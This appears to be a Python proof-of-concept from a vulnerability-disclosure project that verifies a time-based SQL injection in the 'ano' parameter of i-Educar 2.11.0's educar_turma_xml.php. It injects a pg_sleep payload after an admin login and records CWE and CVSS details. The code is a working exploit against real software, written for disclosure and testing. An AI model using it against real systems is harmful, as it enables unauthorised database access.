#!/usr/bin/env python3
"""VULN 12 — time-based SQL injection in educar_turma_xml.php.

`$_GET['ano']` is interpolated into a `CASE WHEN {$anoLetivo} IS NULL ...`
expression. `esc` and `ser` are validated with is_numeric(), `ano` is not. The
PoC injects `(SELECT 2026 FROM pg_sleep(2))` and compares response times with
the baseline; read-only payload.
"""

from __future__ import annotations

import sys
import time
import urllib.parse
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))

from lib import credentials, evidence, http_util, lab_guard, poc_cli  # noqa: E402

VULN = {
    "id": "12",
    "slug": "turma-xml-sql-injection",
    "title": "Time-based SQL injection in educar_turma_xml.php (ano)",
    "product": "i-Educar",
    "affected_version": "2.11.0 (latest release, tag 2.11.0)",
    "cwe_id": "CWE-89",
    "cwe_name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
    "cwe_source_url": "https://cwe.mitre.org/data/definitions/89.html",
    "cwe_confidence": "high",
    "cwe_justification": (
        "$_GET['ano'] is concatenated into a SQL CASE expression with no numeric "
        "validation while sibling parameters are is_numeric()-checked: CWE-89. CWE-20 "
        "describes the missing validation only and would not capture the SQL command "
        "modification."
    ),
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
    "cvss_score": 8.8,
    "endpoint": "GET /intranet/educar_turma_xml.php",
    "params": ["esc", "ser", "ano"],
    "precondition": "login (verified with admin)",
    "reported_at": "",
    "followups": [],
    "silence_days": 0,
    "status": "verified",
    "blocked_reason": "",
    "screenshots": [
        "evidence/screenshots/12-turma-xml-sql-injection-01-time-delay.png",
    ],
    "advisory_url": "https://github.com/i-explorar/i-explorar/blob/main/vulns/12-turma-xml-sql-injection/README.md",
}

ADMIN = credentials.credentials("admin")
PATH = "/intranet/educar_turma_xml.php"
BASELINE_QUERY = "esc=2&ser=6&ano=2026"
INJECTION_QUERY = "esc=2&ser=6&ano=" + urllib.parse.quote("(SELECT 2026 FROM pg_sleep(2))")
THRESHOLD = 1.5


def _timed(client: http_util.HttpClient, query: str) -> tuple[http_util.Response, float]:
    started = time.monotonic()
    response = client.get(f"{PATH}?{query}")
    return response, time.monotonic() - started


def run(target: str, *, verbose: bool = False) -> dict:
    lab_guard.check_target(target)

    vuln_dir = Path(__file__).resolve().parent
    log = evidence.EvidenceLog(vuln_dir)
    notes: list[str] = []
    log.write(f"# target: {target}")
    log.write("# payload: (SELECT 2026 FROM pg_sleep(2)) (read-only)")

    client = http_util.HttpClient(target, verbose=verbose)
    client.login(*ADMIN)
    if not client.logged_in():
        log.close()
        return {"vulnerable": False, "evidence": [str(log.path)], "notes": "admin login failed"}

    baseline, baseline_time = _timed(client, BASELINE_QUERY)
    log.write("")
    log.write(f"### baseline: GET {PATH}?{BASELINE_QUERY}")
    log.write(f"HTTP {baseline.status} elapsed={baseline_time:.3f}s")
    log.block("body", baseline.text.strip()[:500])

    injected, injected_time = _timed(client, INJECTION_QUERY)
    log.write("")
    log.write(f"### injection: GET {PATH}?{INJECTION_QUERY}")
    log.write(f"HTTP {injected.status} elapsed={injected_time:.3f}s")
    log.block("body", injected.text.strip()[:500])

    delta = injected_time - baseline_time
    vulnerable = delta >= THRESHOLD and injected.status == 200
    log.write("")
    log.write(f"# delta={delta:.3f}s threshold={THRESHOLD}s")
    notes.append(
        f"pg_sleep(2) executed inside the CASE expression: baseline={baseline_time:.3f}s "
        f"injected={injected_time:.3f}s delta={delta:.3f}s"
    )
    log.close()
    return {"vulnerable": vulnerable, "evidence": [str(log.path)], "notes": "; ".join(notes)}


def main(argv: list[str] | None = None) -> int:
    return poc_cli.poc_main(VULN, run, argv, __file__)


if __name__ == "__main__":
    sys.exit(main())
